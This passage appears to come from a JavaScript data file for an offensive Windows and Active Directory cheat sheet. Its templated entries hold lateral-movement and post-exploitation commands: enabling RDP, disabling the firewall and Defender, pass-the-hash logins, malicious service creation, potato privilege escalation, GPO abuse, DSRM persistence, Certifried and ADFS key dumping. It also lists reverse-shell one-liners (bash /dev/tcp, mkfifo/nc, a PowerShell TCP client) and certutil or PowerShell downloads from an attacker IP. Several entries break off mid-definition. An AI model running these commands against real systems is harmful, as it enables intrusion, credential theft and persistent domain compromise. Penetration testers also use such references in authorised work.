 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M rdp -o ACTION=enable`,'enable RDP (registry)'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'netsh advfirewall set allprofiles state off'`,'disable firewall'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'`,'manual registry toggle'],
 [`xfreerdp /v:{{target_host}} /u:'{{user}}' /p:'{{password}}' /d:{{domain}} +clipboard /dynamic-resolution`,'connect (password)'],
 [`xfreerdp /v:{{target_host}} /u:'{{user}}' /pth:'{{nthash}}' /d:{{domain}} /dynamic-resolution`,'connect via PtH (Restricted Admin)'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M rdp -o ACTION=disable`,'CLEANUP: disable again']
],note:'PtH over RDP needs <span class="mono">DisableRestrictedAdmin=0</span> on the target: <span class="mono">reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f</span>. nxc module name may vary by version (<span class="mono">rdp</span> vs <span class="mono">enable_rdp</span>).'});

R({id:'rdp-auth',cat:'lateral',title:'RDP auth helper — password, Kerberos ccache, PtH',desc:'xfreerdp on Kali: NLA with or without Kerberos, ticket-only via Restricted Admin, hash fallback.',
cmds:[
 [`export KRB5CCNAME={{ccache}} && klist`,'Kerberos: make sure a valid TGT is present'],
 [`xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /p:'{{password}}' /sec:nla /cert:ignore`,'NLA + password (SPNEGO uses the ccache → Kerberos)'],
 [`xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /p:'{{password}}' /auth-pkg-list:'!ntlm,kerberos' /cert:ignore`,'force Kerberos only (fail if it falls back to NTLM)'],
 [`KRB5CCNAME={{ccache}} xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /restricted-admin /cert:ignore`,'ccache only via Restricted Admin (server must allow it)'],
 [`KRB5CCNAME={{ccache}} xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /remoteGuard /cert:ignore`,'Remote Credential Guard (FreeRDP ≥ 3.9, server-side RCG needed)'],
 [`xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /pth:'{{nthash}}' /restricted-admin /cert:ignore`,'PtH fallback (Restricted Admin)'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'`,'allow Restricted Admin (needs local admin)'],
 [`xfreerdp3 /v:{{target_fqdn}} /u:'{{user}}' /d:{{domain}} /p:'{{password}}' +clipboard /dynamic-resolution /drive:share,/tmp`,'QoL: clipboard, resize, mount /tmp']
],note:'FreeRDP negotiates the Kerberos part of NLA from the ccache, but still needs a password for the NLA credentials payload — unless you use <span class="mono">/restricted-admin</span> (or <span class="mono">/remoteGuard</span>), where those fields may be empty. That is why there is no plain "ticket only" command. Binary is <span class="mono">xfreerdp3</span> or <span class="mono">xfreerdp</span> depending on the Kali package. Always use the FQDN for Kerberos, add <span class="mono">/cert:ignore</span> for lab CAs, and enable RDP first (see <b>lat-rdp</b>). <span class="mono">proxychains</span> works over TCP/3389 but is slow.'});

R({id:'lat-transfer',cat:'lateral',title:'File transfer — attacker ↔ target',desc:'Get tools onto the box or loot out.',
cmds:[
 [`python3 -m http.server {{lport}}`,'serve current dir (attacker, no proxy)','ns'],
 [`impacket-smbserver share $(pwd) -smb2support`,'SMB share (attacker, no proxy)','ns'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --put-file ./tool.exe 'C:\\Windows\\Temp\\tool.exe'`,'nxc upload'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'certutil -urlcache -f http://{{attacker_ip}}:{{lport}}/tool.exe C:\\Windows\\Temp\\tool.exe'`,'certutil download'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -X 'iwr http://{{attacker_ip}}:{{lport}}/tool.exe -OutFile C:\\Windows\\Temp\\tool.exe'`,'PowerShell download'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'copy \\\\{{attacker_ip}}\\share\\tool.exe C:\\Windows\\Temp\\tool.exe'`,'copy from SMB share']
],note:'If egress is filtered, SMB share or WinRM upload are the fallbacks. For reverse shells: <span class="mono">nc -lvnp {{lport}}</span> on Kali and a base64 PowerShell payload on target.'});

R({id:'lat-impacket-extras',cat:'lateral',title:'Impacket extras — dcomexec, services, reg',desc:'DCOM execution, remote service/registry manipulation and RDP checks as alternatives when SMB exec or WMI is blocked.',
cmds:[
 [`impacket-dcomexec -object MMC20 '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'DCOM exec via MMC20.Application'],
 [`impacket-dcomexec -object ShellWindows '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'DCOM via ShellWindows'],
 [`impacket-dcomexec -object ShellBrowserWindow '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'DCOM via ShellBrowserWindow'],
 [`impacket-dcomexec -object MMC20 -hashes ':{{nthash}}' '{{domain}}/{{user}}@{{target_host}}'`,'DCOM via PtH'],
 [`impacket-services '{{domain}}/{{user}}:{{password}}@{{target_host}}' list`,'list services (spot unquoted paths)'],
 [`impacket-services '{{domain}}/{{user}}:{{password}}@{{target_host}}' create -name evil -display Evil -path 'C:\\Windows\\Temp\\evil.exe'`,'create a service (runs as SYSTEM)'],
 [`impacket-services '{{domain}}/{{user}}:{{password}}@{{target_host}}' start -name evil`,'start the service'],
 [`impacket-reg '{{domain}}/{{user}}:{{password}}@{{target_host}}' query -keyName 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'`,'remote registry query'],
 [`impacket-reg '{{domain}}/{{user}}:{{password}}@{{target_host}}' save -keyName 'HKLM\\SAM' -o 'C:\\Windows\\Temp\\SAM'`,'remote registry save (admin)'],
 [`impacket-rdpcheck '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'check RDP and NLA status']
],note:'DCOM needs local admin and the DCOM services enabled — MMC20 usually works, ShellWindows/ShellBrowserWindow are fallbacks. <span class="mono">services create/start</span> leaves artifacts; prefer <span class="mono">change -path</span> on an existing service when possible. Community tools also use these primitives for local privesc (unquoted service paths).'});

/* ===== POST-EXPLOITATION ===== */
R({id:'post-seimpersonate',cat:'post',title:'SeImpersonate / SeAssignPrimaryToken → SYSTEM',desc:'IIS/MSSQL/service shells usually hold these — potato tools get you SYSTEM.',
cmds:[
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -X 'whoami /priv'`,'check privileges'],
 [`KRB5CCNAME={{ccache}} nxc smb {{target_host}} -u '{{user}}' -k --use-kcache -X 'whoami /priv'`,'check via ccache'],
 [`python3 -m http.server {{lport}}`,'serve potatoes (no proxy)','ns'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'certutil -urlcache -f http://{{attacker_ip}}:{{lport}}/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe'`,'transfer PrintSpoofer'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\ps.exe -c "cmd /c whoami"'`,'PrintSpoofer exec'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\GodPotato.exe -cmd "cmd /c whoami"'`,'GodPotato (.NET4)'],

],note:'Pick the potato by OS: PrintSpoofer/GodPotato (modern), SweetPotato/RoguePotato (older), JuicyPotato (2016/2019). Repos: <span class="mono">itm4n/PrintSpoofer</span>, <span class="mono">BeichenDream/GodPotato</span>, <span class="mono">CCob/SweetPotato</span>. Remove the user and tool afterwards.'});

R({id:'post-gpo',cat:'post',title:'GPO abuse',desc:'Write on a GPO? Push a scheduled task / immediate task to every machine in scope.',
cmds:[
 [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M gpp_password`,'GPP cpassword in SYSVOL'],
 [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M gpp_autologin`,'GPP autologin creds'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype GPO --detail`,'find writable GPOs'],
 [`python3 pygpoabuse.py '{{domain}}/{{user}}' -p '{{password}}' -gpo-id '<GPO_GUID>' -command 'net localgroup administrators {{user}} /add' -f`,'push immediate task (Linux)'],

],note:'pyGPOAbuse expects the GPO ID/GUID and write access (GenericWrite/WriteDACL) on the GPO object. Windows alternative: SharpGPOAbuse. Changes land on next <span class="mono">gpupdate</span> (default 90 min ± jitter) — trigger with <span class="mono">nxc smb -x "gpupdate /force"</span> if you are admin.'});

R({id:'post-adidns',cat:'post',title:'ADIDNS record takeover',desc:'Spoof unregistered DNS names or add records for coercion/relay (AD-integrated DNS).',

R({id:'av-defender',cat:'post',title:'AV / Defender check & disable',desc:'Know what protection runs before dropping tools — and turn it off when you have admin.',
cmds:[
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M enum_av`,'detect AV/EDR products'],
 [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -X 'Get-MpComputerStatus | select AMRunningMode,RealTimeProtectionEnabled'`,'Defender status'],
 [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -X 'Get-MpPreference | select ExclusionPath,ExclusionExtension'`,'current exclusions'],
 [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -X 'Set-MpPreference -DisableRealtimeMonitoring $true'`,'disable realtime (admin, loud)'],

],note:'Adding an exclusion is stealthier than killing realtime protection. If Defender is fully managed (Tamper Protection/ASR), prefer in-memory execution or LOLBins. AMSI patching belongs in memory, not in shell history.'});

R({id:'revshells',cat:'post',title:'Reverse shells — Linux & Windows',desc:'Listeners and one-liners for both platforms, plus TTY upgrade and base64 workflow.',
cmds:[
 [`nc -lvnp {{lport}}`,'listener (attacker, no proxy)','ns'],
 [`bash -i >& /dev/tcp/{{attacker_ip}}/{{lport}} 0>&1`,'bash TCP one-liner (target-side)','n'],
 [`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{attacker_ip}} {{lport}} >/tmp/f`,'mkfifo /bin/sh (no bash needed)','n'],
 [`python3 -c 'import pty;pty.spawn("/bin/bash")'`,'upgrade to PTY (target-side)','n'],
 [`stty raw -echo; fg; export TERM=xterm; stty rows 50 cols 200`,'local terminal raw mode + size','n'],
 [`powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('{{attacker_ip}}',{{lport}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,'PowerShell TCP shell (target-side)','n'],
 [`echo -n '<paste PS one-liner>' | base64 -w0`,'base64-encode for -enc (attacker)','n'],
 [`powershell -enc <BASE64>`,'run encoded payload (avoids quoting hell)','n'],
 [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -X "..."`,'deliver the shell via WinRM']
],note:'The PowerShell one-liner is full of <span class="mono">$</span> variables — when sending through nxc/winrm wrap it carefully or use <span class="mono">-enc</span> base64. If <span class="mono">/dev/tcp</span> is disabled, fall back to <span class="mono">nc -e</span>, <span class="mono">socat</span>, PHP or Python. Egress must reach {{attacker_ip}} — tunnel through the pivot if needed.'});

R({id:'uac-bypass',cat:'post',title:'UAC bypass (fodhelper / eventvwr / computerdefaults)',desc:'From a medium-integrity shell: auto-elevating Windows binaries read HKCU keys you can write.',

R({id:'dsrm',cat:'post',title:'DSRM — DC local admin persistence',desc:'Local admin on a DC? The DSRM Administrator hash allows network logon as the DC local Administrator.',
cmds:[
 [`impacket-secretsdump -sam SAM -system SYSTEM LOCAL`,'DSRM hash = local Administrator NT hash'],
 [`nxc smb {{dc_host}} -u Administrator -H '<DSRM_HASH>' --local-auth`,'verify network logon as DC\\Administrator'],
 [`impacket-psexec -hashes ':<DSRM_HASH>' '{{dc_host}}/Administrator@{{dc_ip}}'`,'semi-interactive PtH with the DSRM hash'],
 [`reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f`,'allow DSRM network logon (target-side, if blocked)','n'],
 [`# Windows alternative: mimikatz lsadump::setntlm / set the hash to a known value`,'persistence variant','n']
],note:'DSRM is local to the DC and needs <span class="mono">DsrmAdminLogonBehavior</span> = 2 for network logon (older builds may block it). Classic flow: dump DSRM with local admin → log in as <span class="mono">DC\\Administrator</span> → reset DSRM to a known hash for persistence. Restore the original hash when done. Windows-side equivalent: mimikatz <span class="mono">lsadump::dsrm</span> + <span class="mono">sekurlsa::pth /domain:&lt;DC&gt;</span>.'});

R({id:'dnsadmins',cat:'post',title:'DNSAdmins — plugin DLL to SYSTEM on the DC',desc:'Members of DNSAdmins can point the DNS service at a DLL of their choice and restart it — code runs as SYSTEM on the DC.',
cmds:[

R({id:'cve-certifried',cat:'post',title:'CVE-2022-26923 — Certifried (machine account spoofing)',desc:'Take over a computer account, point its dNSHostName at the DC and request a Machine certificate — then authenticate as the DC.',
cmds:[
 [`impacket-addcomputer -method SAMR -computer-name '{{computer_name}}' -computer-pass '{{computer_pass}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'own or create a machine account'],
 [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -user '{{computer_name}}' update -dns '{{dc_fqdn}}'`,'set dNSHostName to the DC FQDN'],
 [`certipy req -u '{{computer_name}}@{{domain}}' -p '{{computer_pass}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template Machine`,'request a Machine certificate as the spoofed DC'],
 [`certipy auth -pfx '{{dc_host}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → DC TGT + NT hash'],
 [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -user '{{computer_name}}' update -dns ''`,'CLEANUP: reset dNSHostName'],
 [`impacket-addcomputer -method SAMR -computer-name '{{computer_name}}' -delete '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'CLEANUP: delete the machine account']
],note:'Patched since May 2022 (KB5014754): patched CAs embed the SID security extension, so the certificate carries your machine SID and the DC login fails. Quick check: request a <span class="mono">User</span> certificate with certipy — if the output prints <span class="mono">Certificate object SID</span>, the environment is patched. Older bloodyAD syntax for the spoof: <span class="mono">set object &lt;DN&gt; dNSHostName -v &lt;dc.fqdn&gt;</span>. If certipy rejects the machine name, try it without the trailing <span class="mono">$</span>.'});

R({id:'krbrelay',cat:'post',title:'KrbRelayUp — local SYSTEM via Kerberos relay',desc:'Relay the local machine account Kerberos auth to LDAP and abuse RBCD or shadow credentials to spawn a SYSTEM service (needs LDAP signing off).',

R({id:'entra-connect',cat:'post',title:'Entra ID Connect — MSOL/ADSync account abuse',desc:'Hybrid identity: the Azure AD Connect server stores the AD DS connector account (MSOL_*) whose password gives DCSync rights.',

R({id:'adfs-goldensaml',cat:'post',title:'AD FS — Golden SAML (token signing key)',desc:'Compromise the ADFS server, extract the token-signing key and forge SAML tokens for any federated app — MFA included.',
cmds:[

 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --put-file /tmp/ADFSDump.exe 'C:\\Windows\\Temp\\ADFSDump.exe'`,'upload ADFSDump to the ADFS server'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\ADFSDump.exe > C:\\Windows\\Temp\\adfs.txt'`,'dump DKM key + encrypted signing cert'],
